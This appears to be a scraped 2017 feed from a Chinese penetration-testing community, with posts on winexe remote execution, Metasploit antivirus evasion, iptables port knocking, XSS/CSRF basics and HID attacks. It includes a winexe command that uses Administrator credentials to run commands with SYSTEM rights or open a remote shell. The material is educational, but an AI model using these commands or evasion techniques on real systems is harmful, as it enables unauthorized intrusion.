<img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 也就是品牌一上线我们就可以学了吗😍，余大大会不会在知乎live提一提这个事？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/92/3e/923e5a4fcb40feee5c599097f875a70a2864c539f1e4fabfc126ea5cb03d1a63.jpg" width="25px"/> __gump__: 不会，不相关哦

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 我们的福利来了。哈哈哈

<img src="https://file.xiaomiquan.com/b7/dd/b7dd95c269d7a4019c442489289928c3fbfaf56ff2ed021e60eaa645e00026d9.jpg" width="25px"/> __丁丁__: 坐标上海求留坑位


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-12:

内网渗透系列番外篇——winexe

在渗透测试时，如何直接通过一台linux主机去控制一台windows主机。在这里给大家推荐一个工具：winexe,KALI下自带。

winexe可以从Linux上远程执行windows命令（SMB）。用法也很简单,如下：

./winexe --system -U 'Administrator%123123' //192.168.31.165 'cmd.exe /c whoami'

成功执行即可返回whoami的结果。

-U参数用来指定凭据：-U=[DOMAIN/]USERNAME[%PASSWORD]

--system参数，使用system权限来执行命令

条件允许的话：可以直接./winexe -U 'Administrator%123123' //192.168.31.165 'cmd.exe' 返回一个交互式CMD,如图。

工具介绍：
[https://tools.kali.org/maintaining-access/winexe](https://tools.kali.org/maintaining-access/winexe)



下载地址：
[Winexe / current / [b787d2]](https://sourceforge.net/p/winexe/winexe-waf/ci/master/tree/)



kali上的winexe（/usr/bin/winexe）采用的是动态编译，在运行的时候需要同时提供用到的dll/so文件。我们需要静态编译让它独立运行。不管linux主机的权限大小，都可以进行利用。

<img src="https://images.xiaomiquan.com/FgNlxTgx-Cb5t0PQOO66yoDQannq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dmASdZsa2Mvdj38P6y19JANVbGk=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:

> 匿名用户 提问：
基因的那篇paper值得在这里分享么
[http://dnasec.cs.washington.edu/dnasec.pdf](http://dnasec.cs.washington.edu/dnasec.pdf)




如果有翻译那就好了。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 国内现在翻译的都是资讯，还不是 Paper


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#姿势#__

  免杀 MSF Windows Payload 的方法与实践

原创@Moriarty  

MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。

继续阅读：


[免杀 MSF Windows Payload 的方法与实践](http://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA)



<img src="https://images.xiaomiquan.com/FuAF4GxXRaqAg4xPxw8Ia9qPfJL2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o4C2jrRosZz9Ju69zxh2K9pp7q4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 要是有apk免杀就好了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#资源#__

  推荐 BlackHat Arsenal 兵工厂

兵工厂是全球黑帽大会（BlackHat）的一个重要环节，来自全球有能力的黑客在上面分享自己或团队独创的黑兵器。

这届，我看到官方开始号召大家共同维护这个 GitHub：


[GitHub - toolswatch/blackhat-arsenal-tools: Official Black Hat Arsenal Security Tools Repository](https://github.com/toolswatch/blackhat-arsenal-tools)

 

去年我带团队分享了三个黑兵器（ZoomEye、Seebug、Pocsuite），得到了官方的友谊和好评。

这里准备响应官方号召，把我们的东西更新上去。

这上面好兵器真不少，推荐大家收藏学习研究。顺便在此号召下，好东西如果不是非得私有化，可以考虑开源，并在一些国际大会上分享出来，这样的交流氛围多好，对吧？

<img src="https://images.xiaomiquan.com/FmCi7JzgmNxBNLAoPmFzD_7UESAS?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-i5WP9J3HfjqYd6H7J2-7k5tu8g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FgeMTRDBMhGl6b7HRnzvXc68QnWV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PW_uM3bGEGqjn-I7SW56aMzNfdE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fm8BLmQCC3QrngLBiCvGLIXmypdo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:L025lT7sCaAKehX0elGQnvaKfi0=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-12:


__#工具#__

 基础工具之 防火墙管理软件iptables

很多人知道iptables却不知道netfilter,实际上iptables只是linux防火墙的管理工具，真正实现防火墙功能的是netfilter，它集成在linux内核中。

我以前也和大多数人一样，对iptables只会一些简单的操作，编写简单的规则进行网络安全防护，最近几天由于工作需求，对它系统性的研究了一下，才发现原来对它的认识是那么的浅薄。据我所知有一些小型企业，是直接架起一台pc将iptables当成硬件防火墙来用的。

iptables 不仅可以进行常规的规则限制，还可以用来做端口转发、关键字过滤、时间段控制、连接数控制、速率控制，可以通过对recent模块的各个参数进行组合来匹配各种各样的特征包，然后根据匹配规则来执行各种动作，自由度非常大。
一个有趣的例子是当你的ssh不准许外部任何IP进行连接，但是自己有时候又有管理需求，可以定制一个暗号，来使你的ip可以接入ssh。
实例：
(1):iptables -P INPUT DROP
(2):iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
(3):iptables -A INPUT -p icmp --icmp-type 8 -m length --length 128 -m recent --set --name SSHOPEN --rsource -j ACCEPT
(4):iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT
(5):iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --rcheck --seconds 15 --name SSHOPEN --rsource -j ACCEPT

解释：
(1):先将INPUT 默认所有流量全部DROP
(2):-m --state 意思为引用状态匹配扩展，将其中RELATED，ESTABLISHED状态的数据包设置为准许
(3):--icmp-type 8 为ping的请求数据包类型，-m length --length 128，引用length匹配扩展，并且匹配长度为128，icmp包本身包头大小为28，这里填写大小128，实际ping 大小为100的包就可以匹配到，-m recent 为引用recent模块，并设置一个记录的名字为 SSHOPEN，设置完成后，触发一下这个规则，可以在 /proc/net/xt_revent/SSHOPEN 看到相关的记录。--rsource 为记录源IP
(4):这条意思为准许ping的请求包。
(5):增加一条准许连接到22端口，并且状态为新建立，在SSHOPEN 列表有记录源IP，在15秒内，匹配通过这些条件后就准许放行ssh连接了。
配置完后，你再去连ssh是连不通的
你用windows，ping -l 100 IP ，之后再用ssh就可以连接了，相当于一个暗号。

这个例子只是想表达iptables非常自由，脑洞够大的话可以想到各种条件搭配去执行各种动作，有兴趣的话也可以看看我发的第二篇中的，利用iptables进行端口复用的例子，那个作者真是个高手。值得学习！

最后贴一张我做的比较粗糙的关于iptables的思维导图，就是推荐大家在学习一个东西的时候，最好边做笔记并且能把核心的要点都整理出来，这样对学习的效率会是一个很大的提升，并且日后自己回头看，也很容易回忆起来。


[http://www.zsythink.net/archives/1199](http://www.zsythink.net/archives/1199)

    iptables快速入门系列，超爱这种把一个技术工具写的浅显易懂连载十几篇，我真的是非常敬佩这种分享精神的人！

<img src="https://images.xiaomiquan.com/FiJUyuJtGJhraCliPwgk-IzorA6a?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nCPig9yhFVK-Cs6skNsWE9vNEGQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞，好引导！

<img src="https://file.xiaomiquan.com/2d/04/2d04c5195c49789fd86eb912e2ef26da645f19bb1e15ab64753985e2ee22bdba.jpg" width="25px"/> __hezhenhai__: 谢谢 一直是盲点

<img src="https://file.xiaomiquan.com/37/fd/37fd91e45e859e3ab99f01095032c9835770aa37886f6e0cb1bbe400f8f8424f.jpg" width="25px"/> __91__: 通过思维导图能更好地把知识内化为自己的东西，顺便问一下这种图是用什么软件做的？

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__ replies to <img src="https://file.xiaomiquan.com/37/fd/37fd91e45e859e3ab99f01095032c9835770aa37886f6e0cb1bbe400f8f8424f.jpg" width="25px"/> __91__: XMind8

<img src="https://file.xiaomiquan.com/37/fd/37fd91e45e859e3ab99f01095032c9835770aa37886f6e0cb1bbe400f8f8424f.jpg" width="25px"/> __91__ replies to <img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 谢啦

<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 这个博客我看过，写的确实好


...

---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-08-12:


__#基础#__

  使用小密圈的几种姿势

最近体验了一下「知识星球（原小密圈）」的小程序，功能上有些欠缺。不由得担心那些加了圈子却没有下载 App 的朋友们。我整理了一些自己的日常使用姿势给大家参考。

我们可以把眼前的「阻碍」化成「没什么阻碍」。

也期待「知识星球」团队在未来的日子里能够跨过困难，越来越好。


__分享文件:__
[如何舒服的使用小密圈.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/e2/dc/e2dc9b5de68dd3589b802167b0e513c14680978ed2c834725b2d6a044207075e.jpg" width="25px"/> __忘却了年少__: 小密圈app可以从微信公众号那里下载～

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/e2/dc/e2dc9b5de68dd3589b802167b0e513c14680978ed2c834725b2d6a044207075e.jpg" width="25px"/> __忘却了年少__: 国区跳过去是酱紫😑，如果美区之类的能下载那当然也不错，就是没有账号的折腾起来成本高一点。

<img src="https://file.xiaomiquan.com/ea/8f/ea8ffe154c93b2da1b603ccd8f12c8d3dd5148f99f9b552f32df3136a724fc16.jpg" width="25px"/> __xs龙羽__: 苹果的小伙伴们可以，电脑下载pp助手，用pp助手安装


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-11:

> 匿名用户 提问：
余大大，我最近想报i春秋的线下培训，您了解它的实力怎么样吗(或者1到10分可以打几分)


i春秋品牌不错的，你说的这个培训之前我也看到了宣传，不过我没参与不敢乱评分啊。

如果培训能像我们这样十多年一线实战派的团队来做，那自然是没得说，但是我们太懒，因为办这种培训班会非常非常非常累，我有更重要的事要做。

不过吧，我们也不一定不会办...



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 话说，下周日准备办场知乎 Live，算不算线上培训的一点小尝试？

[https://www.zhihu.com/lives/879000006177218560](https://www.zhihu.com/lives/879000006177218560)



<img src="https://file.xiaomiquan.com/0c/a5/0ca53405ff7f48e1d5803414c05b72e5daade600cdc1968252bcf6eb5a35ddd6.jpg" width="25px"/> __懂得__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个挺一下

<img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 我在参加他们广州的培训班😂 现在广州这边的培训班只招了10个人。另外培训的讲师实战经验有，但是在理论知识方面还是有点匮乏，培训效果和体验都有点差强人意的感觉。可能也是第一次线下培训，经验和成本问题的原因，所以现阶段个人观点是不推荐去。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 估计是知其然不知所以然


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:


__#挑战#__

  Google XSS Game 解读公布

好吧，放鸽子有点久，懒得要死，差点忘了，哪怕圈友提醒了好几次。有一个圈友@  自己通关并且写了篇非常清晰的面向新人的教程：


[「从入门到入狱系列」 - xssgame 通关经验 | 灰色地带](http://ev1l.cn/2017/08/03/Google_xssgame/)

 

供玩这个挑战的同学参考学习。

感谢@  的分享。

顺便贴上我之前的通关记录，非常杂乱，将就看看，懒，见评论。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 字数太多评论不下，回去整，等着

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 哈哈哈

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: cos是真的懒……帮cos填个坑……
答应的通关记录拿去～

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 哈哈 赞 被你整理了个pdf

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我怕你后面又忘了有这事儿了……😑

<img src="https://file.xiaomiquan.com/ff/af/ffaf8a9ccb3e3925f58b488e0dcb145d64ed6c0f50c690b4db9cd53b89451525.jpg" width="25px"/> __一只猿__: 这个昨天刚玩过，入门还可以


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:

> 老七 提问：
django写的网站开启了debug，有没有漏洞啥可利用的，django版本是1.10.3


除了知道目标系统一些基本情况之外，我这没有，其他同学有好的利用思路可以说下。



...

<img src="https://file.xiaomiquan.com/77/94/7794a6fa7fe3127b708f61d481fc168de96e9be8d2484ddd20ab6edb9153c405.jpg" width="25px"/> __快看这是一只野生的自然卷__: 开启debug，如果是sql存储或查询出错会暴露models的字段信息（表名，列名），还有出错部分的源码，可以尝试利用，因为本身django提供了很多参数传递的功能，如进行sql查询时tb.objects.filter（id=1），很多常规的测试方法都会失效，只能指望开发人员比较喜欢用语句拼接什么的😰。现在各种cms做的越来越安全，而码农门槛越来越低，还是从逻辑上挖掘漏洞容易些。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:

> 签到啦 提问：
我入圈几天，微博关注您有段时间了。您有条微博写道：“黑客的自由地：GitHub、Twitter、等、等等、等等等 ”，后面的“等”是指代那三个“地”？如果不是，请推荐几个好“地”。


比如：Telegram 频道，如我之前创建的“灰袍推送”：

[https://t.me/greyrobe](https://t.me/greyrobe)



另外一个是：暗网世界，这个就不用公开提了。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:

> 签到啦 提问：
我入圈几天，微博关注您有段时间了。您有条微博写道：“黑客的自由地：GitHub、Twitter、等、等等、等等等 ”，后面的“等”是指代那三个“地”？如果不是，请推荐几个好“地”。


比如：Telegram 频道，如我之前创建的“灰袍推送”：

[https://t.me/greyrobe](https://t.me/greyrobe)



另外一个是：暗网世界，这个就不用公开提了。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-10:


__#公告#__

  关于圈子分享与交流氛围的促进

不少同学有提议想分享内容，但为了圈子质量考虑，如果哪位同学有想分享的可以先私信我，我们代为分享，如果分享精华超高5篇，我们会给你本圈的嘉宾权限，这样之后就可以自由分享。

分享内容不限于：红队技巧（攻击）、蓝队技巧（防御）、黑客成长经验、优秀 Paper 翻译或解读推荐、优秀工具解读推荐、黑客编程经验分享、新漏洞/新威胁经验分享、等。

如果还不明白要怎么分享，看看本圈的“精华”就好，其实不难，对吧？

如果没分享，也可以参与互动，比如点赞、评论等。圈子氛围需要大家共同维护与促进，我们努力来做好这种推动！

请珍惜现在还有的成长氛围。

<img src="https://images.xiaomiquan.com/FuAF4GxXRaqAg4xPxw8Ia9qPfJL2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o4C2jrRosZz9Ju69zxh2K9pp7q4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e8/99/e8995cbaaa741fb20779eff34a1bf93dc54d0ff5113db867b2c2be54e8d5cc07.jpg" width="25px"/> __Null0__: telegram上还有什么好玩的group 和channel

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 看来愿意分享的人还是太少

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 还是新手，只能学习😋

<img src="https://file.xiaomiquan.com/e0/70/e0701df1d5f3ca3d806a37a9b13e74ec4b00ff9c896afeac9dcabf3d0bacc115.jpg" width="25px"/> __Berwin🐻__: 还在入门阶段

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 我也只是新手😄

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 我也只是新手😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-09:


__#科普#__

  XSS 与 CSRF

以下转自我之前在「XSS'OR技能」圈子里的分享，因为正好有同学遇到这个困惑，科普供参考。

XSS

XSS(Cross Site Script，缩写为了区分 CSS，把 C 改为 X，X 本就有 Cross 十字的含义），中文称为“跨站脚本”。我们只要能把我们可控的 JavaScript 脚本内容注入到目标页面，那这个页面就存在 XSS 漏洞。而 JavaScript 就是 XSS 这个过程的核心魔法。

JavaScript 这个核心魔法能在哪里释放？你看看整个 DOM(Document Object Model) 树，能执行 JavaScript 的地方主要有：

1. <script> 标签内；
2. 任意 HTML 标签的 on 属性里；
3. 一些标签的 src/href 属性里的 javascript: 伪协议
4. ...

那么，这些地方，就是我们核心魔法释放的地方。

验证这个魔法是否释放成功，我们经常用 alert("XSS"); 来作为概念验证，效果就是：弹了个框，内容是“XSS”。我们把这种概念验证称为 PoC。

而，在真实实战，我们的核心魔法不能这样简单，必须很直接很强大，那这个过程就是 Exploit 的过程。

这种 Exploit 里往往冲刺着社会工程学，所以可以很猥琐，也正因为这个，玩这个玩的好的黑客，我们称之为猥琐流。这样看来，如果玩不好 JavaScript 这个核心魔法，且不够猥琐，那么是玩不好 XSS 的。😬

根据上面的描述，我们可以把整个 XSS 过程区分为两大部分：

1. XSS 漏洞挖掘；
2. XSS 漏洞利用；

这两大部分充满着艺术，入门不难，精通难。后面我们会逐渐让大家感受到这句话的深意。

看完这个科普，如果你被这种魔法吸引了，那么，搞起！先吃掉 JavaScript 这个核心魔法！

BE EVIL, DON'T BE BAD.

CSRF

CSRF(Cross Site Request Forgery)跨站请求伪造，这个核心点在于：

从目标用户浏览器发出的 HTTP 请求不是用户预期内的，那么都可以认为这是一种跨站请求伪造，关键不在“跨站”，而在“请求伪造”。

那么，通过怎样的机制可以去“请求伪造”，或者说简单点，“发出请求”？回答这个问题前，首先得区分下请求方式都有哪几种？

1. GET 请求，就是一个 URL 形式
2. POST 请求，需要提交表单
3. 其实还可以独立提一种请求方式，就是 AJAX 这种异步请求
4. 其实其实，如果涉及到跨域，就不是提 AJAX 了，而是提 CORS(Cross-Origin Resource Sharing)跨域资源共享。

注：AJAX 与 CORS 共同点在于都是基于 XMLHttpRequest。

区分这些请求方式后，我们就可以挖掘都有什么机制可以发出请求，比如：

1. GET 请求，一堆的标签都可以发出这个请求，如：<img src="[目标 URL]">
2. POST 请求，<form> 表单可以发出
3. AJAX，既然不涉及跨域，那这个时候需要目标页面同时存在一个 XSS 漏洞，其实如果目标页面存在 XSS 漏洞，就不用去提 CSRF 这个事了
4. CORS，涉及到跨域，这个机制其实有点复杂，后面再展开说

上面介绍的都是基本情况，如果要展开，单如 GET 请求，还有个很重要的玩法分支是：JSON Hijacking，这个也会在以后展开说。

另外，要不是现在 Flash 已死，基于 Flash 的玩法绝对是一个极其耀眼的分支，可惜了...

但，自从我玩深入 CORS 之后，在 HTML5&ES6 时代下的前端黑，CSRF 耀眼持续。比如我上面发的那个 CORSBOT，你理解其中精华了吗？

继续回到 CSRF 本身，有个关键点得特别提下，那就是 Cookies 的问题。

如果是 XSS，先不考虑 HttpOnly（这个鬼可以自己查阅相关资料），通过 JavaScript 我们可以拿到 Cookies，这个基本就代表用户身份了，后续利用这些 Cookies 就可以做坏事。而做坏事，CSRF 也一样可以办到，但就不是拿到 Cookies 了，而是借用 Cookies，所谓的“借刀杀人”。

之前科普 XSS 说到，XSS 的核心魔法是 JavaScript。而 CSRF 的核心魔法，相比之下，不是 JavaScript，而是 HTTP 请求。CSRF 的各种姿势及成败与否，全都在于这个 HTTP 请求是否发对。

那么，最后，你真的了解 HTTP 请求吗？



...

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 一直有一个疑问，按照很多公司安全组对csrf的界定，似乎必须是可以被xss所利用的接口才被界定为csrf，通常大家更在乎写操作的接口。因此才有token+referrer的防御csrf，因为这可以有效降低xss与csrf的结合利用。因为如果单独对请求伪造来看，上了token refer限制的接口，一样可以python写一个刷接口的脚本，特别是不需要session的接口，如果只说一个接口有没有可能被刷，那csrf就必须用验证码来防御了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: CSRF 完全可以和 XSS 无关，当然也可以组合。还有 CSRF 是浏览器的事，你用 Python 去刷，已经不是 CSRF 的范畴

<img src="https://file.xiaomiquan.com/f3/3b/f33b025ec97ea15e92a62c2e70f21bf4ba8c478a73380caac254ade553b8e5ec.jpg" width="25px"/> __wangyuan__: 需要这种科普的

<img src="https://file.xiaomiquan.com/f3/3b/f33b025ec97ea15e92a62c2e70f21bf4ba8c478a73380caac254ade553b8e5ec.jpg" width="25px"/> __wangyuan__: 👍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/f3/3b/f33b025ec97ea15e92a62c2e70f21bf4ba8c478a73380caac254ade553b8e5ec.jpg" width="25px"/> __wangyuan__: 有收获就好


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-09:


__#资源#__

  关于这份“黑客成长技术清单”

之前我发布的“安全技能树”里，开头就引入了这个地址，但估计很多人并没认真看。

这两天看到嘶吼的翻译，传播出来了：


[GitHub 万星推荐：黑客成长技术清单 - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com](http://www.4hou.com/info/news/7061.html)

 

还是中文传播快...

大家会发现，内容实在太多太多，多到恐惧，这么多优秀开源黑客项目及相关资料。

之前我经常说：要相信，当你有一个想法想研发一款牛逼的黑客工具时，这世界一定有人已经在研发，并很可能开源出来了...

这份清单正式如此的感觉，但我还是看到一些优秀的没在上面，这份清单也是在不断更新，包括清单的运营团队（@HackwithGithub）每天在推上都有动态，前段时间，我开源的 XSS'OR 他们也推过。

推和 GitHub 里的黑客交流氛围真的很浓厚，国内这块也不用感慨路还很远，国内不必重新再造轮子，参与进国外这些氛围里是最直接的方式，英语和墙的门槛，对我们来说根本不是阻碍。

还好，GitHub 还能如此顺畅。

清单原地址：


[GitHub - Hack-with-Github/Awesome-Hacking: A collection of various awesome lists for hackers, pentesters and security researchers](https://github.com/Hack-with-Github/Awesome-Hacking)





---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-08-07:

HID攻击是badusb攻击中成本最低，门槛最低的一类，通过模拟键盘向目标机器执行代码，本次分享以上手为主，带路三种从简易到实战的HID攻击姿势，每种都附有具体的how to链接。至于具体的payload大伙儿可以随自己喜欢，反正我是喜欢empire😂


__分享文件:__
[HID攻击简易上手.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 最后鼠标的思维拓展nice哦

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 666


...

---

